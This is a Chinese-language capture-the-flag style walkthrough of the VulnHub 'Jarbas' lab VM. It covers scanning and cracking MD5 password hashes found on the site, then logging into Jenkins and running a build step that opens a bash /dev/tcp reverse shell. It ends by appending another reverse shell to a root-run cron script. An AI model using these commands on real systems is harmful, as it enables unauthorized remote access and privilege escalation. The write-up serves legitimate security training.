> 文档说明：https://www.vulnhub.com/entry/jarbas-1,232/
>
> 靶机下载：**[Download (Mirror)](https://download.vulnhub.com/jarbas/Jarbas.zip)**: 

## 信息收集

### 主机发现

扫描C段

```
sudo nmap -sn 10.9.75.0/24
```

![image-20231125131716854](./imgs/image-20231125131716854.png)

### 端口扫描

```
sudo nmap --min-rate 10000 10.9.75.10
```

![image-20231125131847664](./imgs/image-20231125131847664.png)

详细扫描服务版本，系统

```bath 
sudo nmap -sT -sV -O -p 22,80,3306,8080 10.9.75.10 
```

![image-20231125132007149](./imgs/image-20231125132007149.png)

### 目录爆破

```bash
dirsearch -u http://10.9.75.10 -i 200  
```

![image-20231125132323184](./imgs/image-20231125132323184.png)

## 漏洞探测

### whatweb

访问80端口

![image-20231125132425330](./imgs/image-20231125132425330.png)

```bash
whatweb http://10.9.75.10
```



![image-20231125133245051](./imgs/image-20231125133245051.png)

并没有识别到类似的CMS内容管理系统，

继续访问`access.html`发现了类似`用户名:加密后的密码`的东西

![image-20231125132945210](./imgs/image-20231125132945210.png)

###  hash-identifier 

可以使用工具来验证加密类型

```bash
hash-identifier "5978a63b4654c73c60fa24f836386d87"  
```



![image-20231125133052923](./imgs/image-20231125133052923.png)

拿去在线网站进行[md5解密](https://www.somd5.com/)



![image-20231125133516690](./imgs/image-20231125133516690.png)

![image-20231125133605822](./imgs/image-20231125133605822.png)

![image-20231125133636880](./imgs/image-20231125133636880.png)

> `tiago:italia99`
>
> `trindade:marianna`
>
> `eder:vipsu`

访问8080端口

![image-20231125134737788](./imgs/image-20231125134737788.png)

### whatweb

```bash
whatweb http://10.9.75.10:8080
```

![image-20231125134830353](./imgs/image-20231125134830353.png)

指纹识别出一个`Jenkins`的CMS管理系统

尝试使用上面解密出来的密码进行登陆

使用`eder:vipsu`登陆成功！

![image-20231125135041152](./imgs/image-20231125135041152.png)

![image-20231125135104467](./imgs/image-20231125135104467.png)

新建一个任务

![image-20231125135842524](./imgs/image-20231125135842524.png)

选择第一个自由风格软件项目就可以，然后往下翻，点击确定

点击`Build构建`

![image-20231125135948173](./imgs/image-20231125135948173.png)

由于目标系统是linux系统，所以选择第二个`execute shell`

```bash
/bin/bash >& /dev/tcp/10.9.75.3/6868 0>&1

#反弹到kali上
```

点击应用，然后点击保存

![image-20231125140121483](./imgs/image-20231125140121483.png)

这个时候kali先监听`6868`端口

```bash
nc  -lvvp 6868  
```

回到页面上点击立即构建

![image-20231125140412821](./imgs/image-20231125140412821.png)

就反弹到kali机器上了

![image-20231125140529852](./imgs/image-20231125140529852.png)

页面上会显示有一个任务正在运行

![image-20231125140547563](./imgs/image-20231125140547563.png)

我们拿到shell是没有回显的，可以通过`python`获取显示shell

```python
python -c "import pty;pty.spawn('/bin/bash')"
```

![image-20231125140911530](./imgs/image-20231125140911530.png)

最后再计划任务里找到了以`root`运行 的程序

![image-20231125141047389](./imgs/image-20231125141047389.png)

查看文件内容

```bash
cat /etc/script/CleaningScript.sh
```



![image-20231125141328159](./imgs/image-20231125141328159.png)

可以在里面添加反弹shell，

```bash
echo "/bin/bash >& /dev/tcp/10.9.75.3/6869 0>&1" >> /etc/script/CleaningScript.sh
```

![image-20231125141432284](./imgs/image-20231125141432284.png)

kali监听`6869`端口，等待反弹

![image-20231125141555084](./imgs/image-20231125141555084.png)

**Jenkins** 的漏洞利用方式有很多，可以自行去网上查阅相关资料

